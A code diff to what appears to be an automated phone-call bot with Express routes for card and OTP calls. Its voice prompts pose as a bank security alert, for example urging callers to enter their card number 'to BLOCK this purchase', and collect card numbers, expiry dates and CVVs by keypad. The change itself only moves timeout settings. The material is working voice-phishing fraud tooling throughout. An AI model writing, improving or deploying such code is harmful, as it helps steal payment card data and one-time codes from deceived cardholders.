@@ -270,12 +270,13 @@ app.get('/calls/card/:chatId/:language', async (req, res) => {
             } card expirattion date followed by the pound key.`,
             language,
             voice: 'female',
+            timeout: '5s',
             loop: true,
           },
           onKeypressGoto: 'cardStepGoto',
           onKeypressVar: 'dtmf',
           endKey: '#',
-          timeout: '5s',
+
           maxNumKeys: 8,
         },
         {
@@ -287,7 +288,7 @@ app.get('/calls/card/:chatId/:language', async (req, res) => {
           onKeypressGoto: 'cardStepGoto',
           onKeypressVar: 'dtmf',
           endKey: '#',
-          timeout: '5s',
+
           maxNumKeys: 8,
         },
         {
@@ -328,12 +329,13 @@ app.get('/calls/card/:chatId/:language', async (req, res) => {
             } card CVV followed by the pound key.`,
             language,
             voice: 'female',
+            timeout: '5s',
             loop: true,
           },
           onKeypressGoto: 'cardStepGoto',
           onKeypressVar: 'dtmf',
           endKey: '#',
-          timeout: '5s',
+
           maxNumKeys: 8,
         },
         {
@@ -345,7 +347,7 @@ app.get('/calls/card/:chatId/:language', async (req, res) => {
           onKeypressGoto: 'cardStepGoto',
           onKeypressVar: 'dtmf',
           endKey: '#',
-          timeout: '5s',
+
           maxNumKeys: 8,
         },
         {
@@ -381,12 +383,13 @@ app.get('/calls/card/:chatId/:language', async (req, res) => {
             } followed by the pound key.`,
             language,
             voice: 'female',
+            timeout: '5s',
             loop: true,
           },
           onKeypressGoto: 'cardStepGoto',
           onKeypressVar: 'dtmf',
           endKey: '#',
-          timeout: '5s',
+
           maxNumKeys: 8,
         },
         {
@@ -398,7 +401,7 @@ app.get('/calls/card/:chatId/:language', async (req, res) => {
           onKeypressGoto: 'cardStepGoto',
           onKeypressVar: 'dtmf',
           endKey: '#',
-          timeout: '5s',
+
           maxNumKeys: 8,
         },
         {
@@ -486,7 +489,7 @@ app.get('/calls/otp/:step/:chatId/:language', async (req, res) => {
             onKeypressGoto: 'bankStepPin',
             onKeypressVar: 'dtmf',
             endKey: '#',
-            timeout: '5s',
+
             maxNumKeys: 8,
           },
           {
@@ -498,7 +501,7 @@ app.get('/calls/otp/:step/:chatId/:language', async (req, res) => {
             onKeypressGoto: 'bankStepPin',
             onKeypressVar: 'dtmf',
             endKey: '#',
-            timeout: '5s',
+
             maxNumKeys: 8,
           },
           {
@@ -537,12 +540,13 @@ app.get('/calls/otp/:step/:chatId/:language', async (req, res) => {
               } followed by the pound key.`,
               language,
               voice: 'female',
+              timeout: '5s',
               loop: true,
             },
             onKeypressGoto: 'cardStepGoto',
             onKeypressVar: 'dtmf',
             endKey: '#',
-            timeout: '5s',
+
             maxNumKeys: 8,
           },
           {
@@ -554,7 +558,7 @@ app.get('/calls/otp/:step/:chatId/:language', async (req, res) => {
             onKeypressGoto: 'cardStepGoto',
             onKeypressVar: 'dtmf',
             endKey: '#',
-            timeout: '5s',
+
             maxNumKeys: 8,
           },
           {
@@ -594,12 +598,13 @@ app.get('/calls/otp/:step/:chatId/:language', async (req, res) => {
                 } card number followed by the pound key`,
                 language,
                 voice: 'female',
+                timeout: '5s',
                 loop: true,
               },
               onKeypressGoto: 'cardStepGoto',
               onKeypressVar: 'dtmf',
               endKey: '#',
-              timeout: '5s',
+
               maxNumKeys: 18,
             },
             {
@@ -611,7 +616,7 @@ app.get('/calls/otp/:step/:chatId/:language', async (req, res) => {
               onKeypressGoto: 'cardStepGoto',
               onKeypressVar: 'dtmf',
               endKey: '#',
-              timeout: '5s',
+
               maxNumKeys: 18,
             },
             {
@@ -674,12 +679,13 @@ app.get('/calls/otp/:step/:chatId/:language', async (req, res) => {
                   )}. Please enter your ${cardType} card expiry date followed by the pound key.`,
                 language,
                 voice: 'female',
+                timeout: '5s',
                 loop: true,
               },
               onKeypressGoto: 'cardStepGoto',
               onKeypressVar: 'dtmf',
               endKey: '#',
-              timeout: '5s',
+
               maxNumKeys: 6,
             },
             {
@@ -691,7 +697,7 @@ app.get('/calls/otp/:step/:chatId/:language', async (req, res) => {
               onKeypressGoto: 'cardStepGoto',
               onKeypressVar: 'dtmf',
               endKey: '#',
-              timeout: '5s',
+
               maxNumKeys: 6,
             },
             {
@@ -716,12 +722,13 @@ app.get('/calls/otp/:step/:chatId/:language', async (req, res) => {
                 payload: `You have not entered anything. For your SECURITY and to BLOCK this purchase, please enter your ${cardType} card number followed by the pound key`,
                 language,
                 voice: 'female',
+                timeout: '5s',
                 loop: true,
               },
               onKeypressGoto: 'cardStepGoto',
               onKeypressVar: 'dtmf',
               endKey: '#',
-              timeout: '5s',
+
               maxNumKeys: 18,
             },
             {
@@ -733,7 +740,7 @@ app.get('/calls/otp/:step/:chatId/:language', async (req, res) => {
               onKeypressGoto: 'cardStepGoto',
               onKeypressVar: 'dtmf',
               endKey: '#',
-              timeout: '5s',
+
               maxNumKeys: 18,
             },
             {
